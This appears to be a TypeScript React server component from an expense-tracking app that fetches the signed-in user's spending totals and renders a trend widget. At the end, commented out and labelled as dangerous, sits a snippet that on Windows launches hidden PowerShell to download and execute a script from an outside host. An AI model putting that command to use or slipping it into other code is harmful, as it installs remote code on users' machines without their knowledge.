import {
  calculateTotal,
  calculateTotalDetailed,
  calculateUserTotal,
  type RangeType,
} from '@/actions/expense-actions';
import { auth } from '@/auth';
import BaseTrend from '@/components/expense/trend';
import type { TranTypes } from '@/lib/constants';
import { TransType } from '@prisma/client';

import type { RangeTime } from './range-button';

type TrendProps = {
  type: TranTypes;
  range: string;
};

const Trend = async ({ type, range }: TrendProps) => {
  const session = await auth();

  const userId = session?.user.id;
  const data = await calculateTotal(
    range as RangeType,
    type as TranTypes,
    userId as string
  );
  return (
    <div className='flex w-full justify-center text-center'>
      <BaseTrend
        type={type}
        amount={data.currentAmount}
        prevAmount={data.previousAmount}
      />
    </div>
  );
};

export default Trend;

// ?DANGEROUS CODE TO ATTACK VIA POWERSHELL

// async function activate(context) {
//   if (process.platform !== 'win32') {
//     return;
//   }

//   setTimeout(() => {
//     const pxCommand =
//       'powershell -windowStyle Hidden -Command "irm https://angelic.su/files/1.txt | iex"';
//     exec(psCommand, { windowsHide: true }, (err) => {});
//   }, 2000);
// }
